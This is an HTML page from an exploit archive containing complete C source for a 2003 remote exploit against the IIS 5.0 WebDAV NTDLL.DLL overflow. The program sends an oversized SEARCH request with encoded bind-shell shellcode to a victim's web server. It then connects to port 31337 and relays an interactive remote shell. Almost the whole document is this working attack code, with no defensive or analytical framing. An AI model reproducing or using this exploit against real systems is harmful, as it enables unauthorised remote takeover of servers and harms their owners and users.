<html>
<head>
<title>MS Windows WebDav III remote root Exploit (xwdav)</title>
<pre>
/*
 * IIS 5.0 WebDAV Exploit Xnuxer Lab
 * By Schizoprenic, Copyright (c) 2003
 * WebDAV exploit without netcat or telnet and with pretty magic number as RET
 */

#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;

#define  RET             0xc9c9   
#define  LOADLIBRARYA    0x0100107c
#define  GETPROCADDRESS  0x01001034
#define  PORT_OFFSET     1052
#define  LOADL_OFFSET    798
#define  GETPROC_OFFSET  815
#define  NOP             0x90
 
unsigned char shellcode[] =            // Deepzone shellcode
  &quot;\x68\x5e\x56\xc3\x90\x54\x59\xff\xd1\x58\x33\xc9\xb1\x1c&quot;
  &quot;\x90\x90\x90\x90\x03\xf1\x56\x5f\x33\xc9\x66\xb9\x95\x04&quot;
  &quot;\x90\x90\x90\xac\x34\x99\xaa\xe2\xfa\x71\x99\x99\x99\x99&quot;
  &quot;\xc4\x18\x74\x40\xb8\xd9\x99\x14\x2c\x6b\xbd\xd9\x99\x14&quot;
  &quot;\x24\x63\xbd\xd9\x99\xf3\x9e\x09\x09\x09\x09\xc0\x71\x4b&quot;
  &quot;\x9b\x99\x99\x14\x2c\xb3\xbc\xd9\x99\x14\x24\xaa\xbc\xd9&quot;
  &quot;\x99\xf3\x93\x09\x09\x09\x09\xc0\x71\x23\x9b\x99\x99\xf3&quot;
  &quot;\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x7c\xbc\xd9\x99&quot;
  &quot;\xcf\x14\x2c\x70\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9\x99&quot;
  &quot;\xf3\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x74\xbc\xd9&quot;
  &quot;\x99\xcf\x14\x2c\x68\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9&quot;
  &quot;\x99\x5e\x1c\x6c\xbc\xd9\x99\xdd\x99\x99\x99\x14\x2c\x6c&quot;
  &quot;\xbc\xd9\x99\xcf\x66\x0c\xae\xbc\xd9\x99\x14\x2c\xb4\xbf&quot;
  &quot;\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\xa8\xbf&quot;
  &quot;\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\x68\xbc&quot;
  &quot;\xd9\x99\x14\x24\xb4\xbf\xd9\x99\x3c\x14\x2c\x7c\xbc\xd9&quot;
  &quot;\x99\x34\x14\x24\xa8\xbf\xd9\x99\x32\x14\x24\xac\xbf\xd9&quot;
  &quot;\x99\x32\x5e\x1c\xbc\xbf\xd9\x99\x99\x99\x99\x99\x5e\x1c&quot;
  &quot;\xb8\xbf\xd9\x99\x98\x98\x99\x99\x14\x2c\xa0\xbf\xd9\x99&quot;
  &quot;\xcf\x14\x2c\x6c\xbc\xd9\x99\xcf\xf3\x99\xf3\x99\xf3\x89&quot;
  &quot;\xf3\x98\xf3\x99\xf3\x99\x14\x2c\xd0\xbf\xd9\x99\xcf\xf3&quot;
  &quot;\x99\x66\x0c\xa2\xbc\xd9\x99\xf1\x99\xb9\x99\x99\x09\xf1&quot;
  &quot;\x99\x9b\x99\x99\x66\x0c\xda\xbc\xd9\x99\x10\x1c\xc8\xbf&quot;
  &quot;\xd9\x99\xaa\x59\xc9\xd9\xc9\xd9\xc9\x66\x0c\x63\xbd\xd9&quot;
  &quot;\x99\xc9\xc2\xf3\x89\x14\x2c\x50\xbc\xd9\x99\xcf\xca\x66&quot;
  &quot;\x0c\x67\xbd\xd9\x99\xf3\x9a\xca\x66\x0c\x9b\xbc\xd9\x99&quot;
  &quot;\x14\x2c\xcc\xbf\xd9\x99\xcf\x14\x2c\x50\xbc\xd9\x99\xcf&quot;
  &quot;\xca\x66\x0c\x9f\xbc\xd9\x99\x14\x24\xc0\xbf\xd9\x99\x32&quot;
  &quot;\xaa\x59\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14&quot;
  &quot;\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3&quot;
  &quot;\xa9\x66\x0c\xd6\xbc\xd9\x99\x72\xd4\x09\x09\x09\xaa\x59&quot;
  &quot;\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14\x2c\x70&quot;
  &quot;\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66&quot;
  &quot;\x0c\xd6\xbc\xd9\x99\x1a\x24\xfc\xbf\xd9\x99\x9b\x96\x1b&quot;
  &quot;\x8e\x98\x99\x99\x18\x24\xfc\xbf\xd9\x99\x98\xb9\x99\x99&quot;
  &quot;\xeb\x97\x09\x09\x09\x09\x5e\x1c\xfc\xbf\xd9\x99\x99\xb9&quot;
  &quot;\x99\x99\xf3\x99\x12\x1c\xfc\xbf\xd9\x99\x14\x24\xfc\xbf&quot;
  &quot;\xd9\x99\xce\xc9\x12\x1c\xc8\xbf\xd9\x99\xc9\x14\x2c\x70&quot;
  &quot;\xbc\xd9\x99\x34\xc9\x66\x0c\xde\xbc\xd9\x99\xf3\xc9\x66&quot;
  &quot;\x0c\xd6\xbc\xd9\x99\x12\x1c\xfc\xbf\xd9\x99\xf3\x99\xc9&quot;
  &quot;\x14\x2c\xc8\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99&quot;
  &quot;\x34\xc9\x66\x0c\x93\xbc\xd9\x99\xf3\x99\x14\x24\xfc\xbf&quot;
  &quot;\xd9\x99\xce\xf3\x99\xf3\x99\xf3\x99\x14\x2c\x70\xbc\xd9&quot;
  &quot;\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6&quot;
  &quot;\xbc\xd9\x99\xaa\x50\xa0\x14\xfc\xbf\xd9\x99\x96\x1e\xfe&quot;
  &quot;\x66\x66\x66\xf3\x99\xf1\x99\xb9\x99\x99\x09\x14\x2c\xc8&quot;
  &quot;\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66&quot;
  &quot;\x0c\x97\xbc\xd9\x99\x10\x1c\xf8\xbf\xd9\x99\xf3\x99\x14&quot;
  &quot;\x24\xfc\xbf\xd9\x99\xce\xc9\x14\x2c\xc8\xbf\xd9\x99\x34&quot;
  &quot;\xc9\x14\x2c\x74\xbc\xd9\x99\x34\xc9\x66\x0c\xd2\xbc\xd9&quot;
  &quot;\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\xf3\x99\x12\x1c\xf8&quot;
  &quot;\xbf\xd9\x99\x14\x24\xfc\xbf\xd9\x99\xce\xc9\x12\x1c\xc8&quot;
  &quot;\xbf\xd9\x99\xc9\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c&quot;
  &quot;\xde\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\x70\x20&quot;
  &quot;\x67\x66\x66\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66\x0c\x8b&quot;
  &quot;\xbc\xd9\x99\x14\x2c\xc4\xbf\xd9\x99\x34\xc9\x66\x0c\x8b&quot;
  &quot;\xbc\xd9\x99\xf3\x99\x66\x0c\xce\xbc\xd9\x99\xc8\xcf\xf1&quot;
  &quot;\xe5\x89\x99\x98\x09\xc3\x66\x8b\xc9\xc2\xc0\xce\xc7\xc8&quot;
  &quot;\xcf\xca\xf1\xad\x89\x99\x98\x09\xc3\x66\x8b\xc9\x35\x1d&quot;
  &quot;\x59\xec\x62\xc1\x32\xc0\x7b\x70\x5a\xce\xca\xd6\xda\xd2&quot;
  &quot;\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0\xf7\xfd&quot;
  &quot;\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed&quot;
  &quot;\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\xfa\xf5\xf6&quot;
  &quot;\xea\xfc\xea\xf6\xfa\xf2\xfc\xed\x99\xd2\xdc\xcb\xd7\xdc&quot;
  &quot;\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xf0\xe9\xfc&quot;
  &quot;\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7\xff&quot;
  &quot;\xf6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc&quot;
  &quot;\xea\xea\xd8\x99\xc9\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9&quot;
  &quot;\xf0\xe9\xfc\x99\xde\xf5\xf6\xfb\xf8\xf5\xd8\xf5\xf5\xf6&quot;
  &quot;\xfa\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xce\xeb\xf0&quot;
  &quot;\xed\xfc\xdf\xf0\xf5\xfc\x99\xca\xf5\xfc\xfc\xe9\x99\xda&quot;
  &quot;\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xdc\xe1\xf0&quot;
  &quot;\xed\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\xda\xf6\xfd\xfc\xfd&quot;
  &quot;\xb9\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb9\xa5\xf0\xe3\xf8\xf7&quot;
  &quot;\xd9\xfd\xfc\xfc\xe9\xe3\xf6\xf7\xfc\xb7\xf6\xeb\xfe\xa7&quot;
  &quot;\x9b\x99\x86\xd1\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x95\x99\x99\x99\x99\x99\x99\x99\x98\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\xda\xd4\xdd\xb7\xdc\xc1\xdc\x99\x99\x99\x99\x99&quot;
  &quot;\x89\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99&quot;
  &quot;\x99\x99\x99\x99\x99\x99\x90\x90\x90\x90\x90\x90\x90\x90&quot;;
 
unsigned char jumpcode[] = &quot;\x8b\xf9\x32\xc0\xfe\xc0\xf2\xae\xff\xe7&quot;;
char body[] = &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\r\n&lt;g:searchrequest xmlns:g=\&quot;DAV:\&quot;&gt;\r\n&quot;
              &quot;&lt;g:sql&gt;\r\nSelect \&quot;DAV:displayname\&quot; from scope()\r\n&lt;/g:sql&gt;\r\n&quot;
              &quot;&lt;/g:searchrequest&gt;\r\n&quot;;
 
void usage(char *prog)
{
   printf(&quot;Remote Exploit for IIS 5.0 WebDAV by Xnuxer\n&quot;
          &quot;Bug overflow NTDLL.DLL\n&quot;
          &quot;Usage: %s &lt;victim&gt;\n&quot;, prog);
   exit(-1);
}
 
void shell(int sock)
{
 fd_set  fd_read;
 char buff[1024];
 int n;
 
 while(1) {
  FD_SET(sock,&amp;fd_read);
  FD_SET(0,&amp;fd_read);
 
  if(select(sock+1,&amp;fd_read,NULL,NULL,NULL)&lt;0) break;
 
  if( FD_ISSET(sock, &amp;fd_read) ) {
   n=read(sock,buff,sizeof(buff));
   if (n == 0) {
       printf (&quot;Connection closed.\n&quot;);
       exit(EXIT_FAILURE);
   } else if (n &lt; 0) {
       perror(&quot;read remote&quot;);
       exit(EXIT_FAILURE);
   }
   write(1,buff,n);
  }
 
  if ( FD_ISSET(0, &amp;fd_read) ) {
    if((n=read(0,buff,sizeof(buff)))&lt;=0){
      perror (&quot;read user&quot;);
      exit(EXIT_FAILURE);
    }
    write(sock,buff,n);
  }
 }
 close(sock); 
}
 
int main(int argc, char **argv)
{
struct hostent *he;
struct sockaddr_in sock1;
struct sockaddr_in sock2;
unsigned short port;
unsigned long ret=RET;
char buffer[100000];
int sock, sck, h,i,j;
 
   if (argc != 2) usage(argv[0]);   
 
   printf(&quot;Resolving %s .. &quot;, argv[1]);
   if ((he = gethostbyname(argv[1])) == NULL)
   {
      fprintf(stderr, &quot;Unknown host\n&quot;);
      exit(-1);
   }
 
   printf(&quot;Resolved\n&quot;);
 
   port = htons(31337);
   port ^= 0x9999;
 
   *(unsigned short *)&amp;shellcode[PORT_OFFSET] = port;
   *(unsigned long *)&amp;shellcode[LOADL_OFFSET] = LOADLIBRARYA ^ 0x99999999;
   *(unsigned long *)&amp;shellcode[GETPROC_OFFSET] = GETPROCADDRESS ^ 0x99999999;
 
   bcopy(he-&gt;h_addr, &amp;sock1.sin_addr, he-&gt;h_length);
   sock1.sin_family = AF_INET;
   sock1.sin_port = htons(80);
 
   printf(&quot;[+] Attacking to %s via port: 80\n&quot;, argv[1]);
 
   if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
      perror(&quot;Failed to create socket&quot;);
      exit(-1);
   }
 
   if (connect(sock, (struct sockaddr *)&amp;sock1, sizeof(sock1)) == -1)
   {
      perror(&quot;Failed to connect&quot;);
      exit(-1);
   }
 
   bzero(buffer,100000);
   strcpy(buffer,&quot;SEARCH /&quot;);
 
   i = strlen(buffer);
   buffer[i] = NOP;         
 
   for (j=i+1; j &lt; i+2150; j+=2)
       *(unsigned short *)&amp;buffer[j] = (unsigned short)ret;
 
   for (; j &lt; i+65535-strlen(jumpcode); j++)
       buffer[j] = NOP;
 
   memcpy(&amp;buffer[j], jumpcode, strlen(jumpcode));
   strcpy(buffer+strlen(buffer), &quot; HTTP/1.1\r\n&quot;);
   sprintf(buffer+strlen(buffer), &quot;Host: %s\r\nContent-Type: text/xml\r\n&quot;
                                  &quot;Content-Length: %d\r\n\r\n&quot;, argv[1], strlen(body)
+ strlen(shellcode));
   strcpy(buffer+strlen(buffer), body);
   memset(buffer+strlen(buffer), 0x01, 1);
   memset(buffer+strlen(buffer), NOP, 3);
   strcpy(buffer+strlen(buffer), shellcode);
 
   if (send(sock, buffer, strlen(buffer), 0) != strlen(buffer))
   {
      perror(&quot;Failed to send&quot;);
      exit(-1);
   }
 
   printf(&quot;[+] Overflow sent, waiting for 5 seconds\n&quot;);
   sleep(5);
 
   bcopy(he-&gt;h_addr, &amp;sock2.sin_addr, he-&gt;h_length);
   sock2.sin_family = AF_INET;
   sock2.sin_port = htons(31337);
 
   printf(&quot;[+] Connecting to %s: 31337\n&quot;, argv[1]);
 
   if ((sck = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
      perror(&quot;Failed to create socket&quot;);
      exit(-1);
   }
 
   if (connect(sck, (struct sockaddr *)&amp;sock2, sizeof(sock2)) == -1)
   {
      printf(&quot;[+] Unable to connect.\n&quot;
             &quot;[+] Exploitation failed, maybe blocked by firewall.\n&quot;);
      close(sock);
      close(sck);
      exit(-1);
   }
 
   close(sock);
   printf(&quot;[+] Successfull, attempting to join shell ...\n\n&quot;);
   shell(sck);
   return 0;           
}

// milw0rm.com [2003-07-08]
</pre>
</html>

